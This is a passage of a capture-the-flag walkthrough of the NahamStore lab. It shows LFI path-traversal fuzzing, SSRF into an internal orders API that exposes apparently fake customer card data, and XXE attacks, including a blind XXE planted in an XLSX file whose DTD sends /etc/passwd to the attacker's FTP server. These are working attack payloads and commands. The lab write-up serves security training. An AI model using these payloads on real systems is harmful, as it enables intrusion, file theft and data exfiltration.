          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nahamstore.thm/product/picture/?file=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Response size: 19
________________________________________________

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 213ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 204ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 218ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 208ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 205ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 207ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 204ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 211ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 191ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 198ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 199ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 193ms]
    * FUZZ: ....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 197ms]
    * FUZZ: ....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 199ms]
    * FUZZ: ....//....//....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 210ms]
    * FUZZ: ....//....//....//....//....//....//....//etc/passwd

[Status: 200, Size: 45, Words: 9, Lines: 1, Duration: 220ms]
    * FUZZ: ....//....//....//....//....//etc/passwd

:: Progress: [922/922] :: Job [1/1] :: 200 req/sec :: Duration: [0:00:05] :: Errors: 0 ::

GET /product/picture/?file=....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//lfi/flag.txt HTTP/1.1

{7ef60e74b711f4c3a1fdf5a131ebf863}

```

LFI Flag

*{7ef60e74b711f4c3a1fdf5a131ebf863}*

###  SSRF

The application has an SSRF vulnerability, see how you can exploit it to view an API that shouldn't be available.  

Answer the questions below

```
look for domains

GET /register?redirect_url=127.0.0.1 HTTP/1.1

3420 bytes the same val doing another payloads maybe is whitelisting just accepting nahamstore.thm

Request
POST /stockcheck HTTP/1.1
...
product_id=2&server=stock.nahamstore.thm

Response
{"id":2,"name":"Sticker Pack","stock":293}

product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm#

{"server":"stock.nahamstore.thm","endpoints":[{"url":"\/product"}]}

product_id=2&server=stock.nahamstore.thm@stock.nahamstore.thm/product#

{"items":[{"id":1,"name":"Hoodie + Tee","stock":56,"endpoint":"\/product\/1"},{"id":2,"name":"Sticker Pack","stock":293,"endpoint":"\/product\/2"}]}


product_id=2&server=stock.nahamstore.thm@localhost

NahamStore - 404 Page Not Found

so let's add a comment

product_id=2&server=stock.nahamstore.thm@localhost#

NahamStore - Home

Now we need to found and API endpoint

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ locate seclists | grep dns
/usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt

product_id=2&server=stock.nahamstore.thm@§fuzz§.nahamstore.thm#

It will take some time

Much better let's create a wordlist with the word api

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ more /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt | grep api | tee -a api_ssrf

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ more api_ssrf | grep '\-api\|api\-' | tee -a final_api_ssrf

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ wc -l final_api_ssrf                                                
4732 final_api_ssrf

now let's do it with our wordlist

after a long time

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cat final_api_ssrf | grep -n internal-api
2842:internal-api
2843:internal-api.dev
2844:internal-api-docs
2845:internal-api-gw
2846:internal-api.staging
2847:internal-api.test


product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm#

different length 346

Response:

{"server":"internal-api.nahamstore.com","endpoints":["\/orders"]}



product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders#

Response:

[{"id":"4dbc51716426d49f524e10d4437a5f5a","endpoint":"\/orders\/4dbc51716426d49f524e10d4437a5f5a"},{"id":"5ae19241b4b55a360e677fdd9084c21c","endpoint":"\/orders\/5ae19241b4b55a360e677fdd9084c21c"},{"id":"70ac2193c8049fcea7101884fd4ef58e","endpoint":"\/orders\/70ac2193c8049fcea7101884fd4ef58e"}]


product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc51716426d49f524e10d4437a5f5a#

{"id":"4dbc51716426d49f524e10d4437a5f5a","customer":{"id":1,"name":"Rita Miles","email":"rita.miles969@gmail.com","tel":"816-719-7115","address":{"line_1":"3914  Charles Street","city":"Farmington Hills","state":"Michigan","zipcode":"48335"},"items":[{"name":"Sticker Pack","cost":"15.00"}],"payment":{"type":"MasterCard","number":"5376118225360051","expires":"05\/2024","CVV2":"610"}}}

product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/5ae19241b4b55a360e677fdd9084c21c#

{"id":"5ae19241b4b55a360e677fdd9084c21c","customer":{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","address":{"line_1":"3999  Clay Lick Road","city":"Englewood","state":"Colorado","zipcode":"80112"},"items":[{"name":"Hoodie + Tee","cost":"25.00"}],"payment":{"type":"MasterCard","number":"5190216301622131","expires":"11\/2023","CVV2":"223"}}}

Using Burp collaborator

product_id=2&server=stock.nahamstore.thm@tdalp9ofw2fyixw8to5ybeygs7yymn.oastify.com#

Poll now 

The Collaborator server received a DNS lookup of type A for the domain name tdalp9ofw2fyixw8to5ybeygs7yymn.oastify.com.  The lookup was received from IP address 34.242.153.181 at 2023-Mar-22 23:00:21 UTC.

Referer: kayxl6bn5iyptwvamdq2e3uyppvfj4.oastify.com

product_id=2&server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/70ac2193c8049fcea7101884fd4ef58e#

{"id":"70ac2193c8049fcea7101884fd4ef58e","customer":{"id":3,"name":"Charles Cook","email":"maverick1974@hotmail.com","tel":"617-776-8871","address":{"line_1":"4754 Swick Hill Street","city":"Harahan","state":"Louisiana","zipcode":"70123"},"items":[{"name":"Sticker Pack","cost":"15.00"}],"payment":{"type":"Visa","number":"4539923410704592","expires":"12\/2023","CVV2":"715"}}}


```

![[Pasted image 20230322180055.png]]

Credit Card Number For Jimmy Jones

*5190216301622131*

### XXE

Somewhere in the application. there is an endpoint that is vulnerable to an XXE attack. You can use this vulnerability to retrieve files on the server. We've hidden a flag in /flag.txt to find.  

Answer the questions below

```
look for xml

POST /product/1 HTTP/1.1

HTTP/1.1 401 Unauthorized
["Missing header X-Token"]

Let's use turbo intruder (Extensions send to turbo intruder)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ locate seclists | grep param
/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ more /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt | wc -l
6453


Here replace it

for word in open('/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt'):

and %s

POST /product/1?%s HTTP/1.1

Attack 

POST /product/1?xml HTTP/1.1

HTTP/1.1 400 Bad Request

Server: nginx/1.14.0 (Ubuntu)

Date: Wed, 22 Mar 2023 22:30:25 GMT

Content-Type: application/xml; charset=utf-8

Transfer-Encoding: chunked

Connection: keep-alive

<?xml version="1.0"?>
<data><error>Invalid XML supplied</error></data>

send to repeater


Request:
POST /product/1?xml HTTP/1.1

Host: stock.nahamstore.thm

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Content-Type: application/x-www-form-urlencoded

Content-Length: 71


<?xml version="1.0"?>

<data><error>Invalid XML supplied</error></data>

<?xml version="1.0"?>
<data><error>X-Token not supplied</error></data>

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection

## Detect the vulnerability

Basic entity test, when the XML parser parses the external entities the result should contain "John" in `firstName` and "Doe" in `lastName`. Entities are defined inside the `DOCTYPE` element.

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>

again

<?xml version="1.0"?>

<!DOCTYPE replace [<!ENTITY example "witty"> ]>

<data><X-Token>&example;</X-Token></data>

<?xml version="1.0"?>
<data><error>X-Token wittyis invalid</error></data>

Now let's get flag

Request:

<?xml version="1.0"?>

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>

<data><X-Token>&test;</X-Token></data>

Response:

HTTP/1.1 401 Unauthorized

Server: nginx/1.14.0 (Ubuntu)

Date: Wed, 22 Mar 2023 22:39:33 GMT

Content-Type: application/xml; charset=utf-8

Connection: keep-alive

Content-Length: 1302

<?xml version="1.0"?>
<data><error>X-Token root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
is invalid

<?xml version="1.0"?>

<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>

<data><X-Token>&test;</X-Token></data>

<?xml version="1.0"?>
<data><error>X-Token {9f18bd8b9acaada53c4c643744401ea8}
is invalid</error></data>

Now let's search for blind XXE

http://nahamstore.thm/staff

uploading xlsx (Excel)

### XXE inside XLSX file

Structure of the XLSX:


$ 7z l xxe.xlsx
[...]
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00 .....          578          223  _rels/.rels
2021-10-17 15:19:00 .....          887          508  xl/workbook.xml
2021-10-17 15:19:00 .....         4451          643  xl/styles.xml
2021-10-17 15:19:00 .....         2042          899  xl/worksheets/sheet1.xml
2021-10-17 15:19:00 .....          549          210  xl/_rels/workbook.xml.rels
2021-10-17 15:19:00 .....          201          160  xl/sharedStrings.xml
2021-10-17 15:19:00 .....          731          352  docProps/core.xml
2021-10-17 15:19:00 .....          410          246  docProps/app.xml
2021-10-17 15:19:00 .....         1367          345  [Content_Types].xml
------------------- ----- ------------ ------------  ------------------------
2021-10-17 15:19:00              11216         3586  9 files


Extract Excel file: `7z x -oXXE xxe.xlsx`

Rebuild Excel file:


$ cd XXE
$ 7z u ../xxe.xlsx *


Add your blind XXE payload inside `xl/workbook.xml`.

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">

Alternativly, add your payload in `xl/sharedStrings.xml`:

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT t ANY ><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&rrr;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>

Using a remote DTD will save us the time to rebuild a document each time we want to retrieve a different file. Instead we build the document once and then change the DTD. And using FTP instead of HTTP allows to retrieve much larger files.

`xxe.dtd`

<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://x.x.x.x:2121/%d;'>"> 

Serve DTD and receive FTP payload using [xxeserv](https://github.com/staaldraad/xxeserv):


$ xxeserv -o files.log -p 2121 -w -wd public -wp 8000


Let's follow the steps

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ sudo apt install libreoffice 

in my case I didn't have excel 😂

let's install

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ mkdir XXE    

open LibreOffice Calc and save it with test.xlsx (File type Excel 2007, Use Excel)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd XXE                                   
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ ls                          
test.xlsx
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ file test.xlsx                                                                                                      
test.xlsx: Microsoft Excel 2007+

now unzip it

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ unzip test.xlsx                     
Archive:  test.xlsx
  inflating: _rels/.rels             
  inflating: xl/workbook.xml         
  inflating: xl/styles.xml           
  inflating: xl/worksheets/sheet1.xml  
  inflating: xl/_rels/workbook.xml.rels  
  inflating: xl/sharedStrings.xml    
  inflating: docProps/core.xml       
  inflating: docProps/app.xml        
  inflating: [Content_Types].xml  

so contains xml 

now edit xl/workbook.xml

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ mousepad xl/workbook.xml                                                             
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ cat xl/workbook.xml 
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.8.19.103:1234/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">

here http://10.8.19.103:1234 (replace with ur ip and port u want)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ mv test.xlsx ../                    
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ ls
'[Content_Types].xml'   docProps   _rels   xl

now rebuild it

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ 7z u xxe.xlsx * 

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,32 CPUs Intel(R) Core(TM) i5-10210U CPU @ 1.60GHz (806EC),ASM,AES-NI)

Scanning the drive:
5 folders, 9 files, 10724 bytes (11 KiB)

Creating archive: xxe.xlsx

Items to compress: 14

                          
Files read from disk: 9
Archive size: 5322 bytes (6 KiB)
Everything is Ok

and is time to upload it to /staff 

Your timesheet has been uploaded successfully

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.202.146 - - [22/Mar/2023 20:09:40] code 404, message File not found
10.10.202.146 - - [22/Mar/2023 20:09:40] "GET /xxe.dtd HTTP/1.0" 404 -

so continue with the steps

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ mousepad xxe.dtd        
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ cat xxe.dtd 
<!ENTITY % d SYSTEM "file:///etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>"> 

┌──(witty㉿kali)-[~/bug_hunter]
└─$ git clone https://github.com/staaldraad/xxeserv.git
Cloning into 'xxeserv'...
remote: Enumerating objects: 45, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 45 (delta 0), reused 3 (delta 0), pack-reused 41
Receiving objects: 100% (45/45), 6.63 MiB | 4.40 MiB/s, done.
Resolving deltas: 100% (15/15), done.

┌──(witty㉿kali)-[~/bug_hunter]
└─$ cd xxeserv 
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ ls
dtds  payloads.md  README.md  xxeftp.go
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ go build                                                                              
go: cannot find main module, but found .git/config in /home/witty/bug_hunter/xxeserv
	to create a module there, run:
	go mod init

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ go mod init xxeftp.go
go: creating new go.mod: module xxeftp.go
go: to add module requirements and sums:
	go mod tidy

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ go build                                                             
                                                                                                                                      
┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ ls
dtds  go.mod  payloads.md  README.md  xxeftp.go

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000 
2023/03/22 20:15:24 [*] File doesn't exist, creating
2023/03/22 20:15:24 [*] Storing session into the file: files.log
2023/03/22 20:15:24 [*] Starting Web Server on 8000 [public]
[*] No certificate files found in directory. Generating new...
[*] UNO Listening...
[*] Certificate files generated
2023/03/22 20:15:24 [*] GO XXE FTP Server - Port:  2121

in another tab let it run (or if using terminator or tmux is easier)

┌──(witty㉿kali)-[~/bug_hunter/Endpoints]
└─$ cd XXE       
                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ ls
'[Content_Types].xml'   _rels   xxe.dtd
 docProps               xl      xxe.xlsx
                                                                  
┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...

upload again

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.202.146 - - [22/Mar/2023 20:17:21] "GET /xxe.dtd HTTP/1.0" 200 -

but I don't get it

use php filter base64 (replace in xxe.dtd)

https://medium.com/@nyomanpradipta120/local-file-inclusion-vulnerability-cfd9e62d12cb

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ cat xxe.dtd 
<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.8.19.103:2121/%d;'>">

┌──(witty㉿kali)-[~/bug_hunter/Endpoints/XXE]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.202.146 - - [22/Mar/2023 20:21:46] "GET /xxe.dtd HTTP/1.0" 200 

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ ./xxeftp.go -o files.log -p 2121 -w -wd public -wp 8000 
2023/03/22 20:15:24 [*] File doesn't exist, creating
2023/03/22 20:15:24 [*] Storing session into the file: files.log
2023/03/22 20:15:24 [*] Starting Web Server on 8000 [public]
[*] No certificate files found in directory. Generating new...
[*] UNO Listening...
[*] Certificate files generated
2023/03/22 20:15:24 [*] GO XXE FTP Server - Port:  2121
2023/03/22 20:21:47 [*] Connection Accepted from [10.10.202.146:33514]
2023/03/22 20:21:48 [x] Connection Closed
2023/03/22 20:21:48 [*] Closing FTP Connection
2023/03/22 20:21:48 [*] Connection Accepted from [10.10.202.146:33518]
2023/03/22 20:21:50 [x] Connection Closed
2023/03/22 20:21:50 [*] Closing FTP Connection

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ cat files.log   
USER:  anonymous
PASS:  anonymous
//cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAxOjEwMTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDI6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMzoxMDQ6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwNDoxMDU6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4K
SIZE
MDTM
USER:  anonymous
PASS:  anonymous
SIZE
PASV

┌──(witty㉿kali)-[~/bug_hunter/xxeserv]
└─$ echo "cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovdmFyL3J1bi9pcmNkOi91c3Ivc2Jpbi9ub2xvZ2luCmduYXRzOng6NDE6NDE6R25hdHMgQnVnLVJlcG9ydGluZyBTeXN0ZW0gKGFkbWluKTovdmFyL2xpYi9nbmF0czovdXNyL3NiaW4vbm9sb2dpbgpub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCl9hcHQ6eDoxMDA6NjU1MzQ6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAxOjEwMTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDI6MTAyOnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMzoxMDQ6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwNDoxMDU6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4K" | base64 -d
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
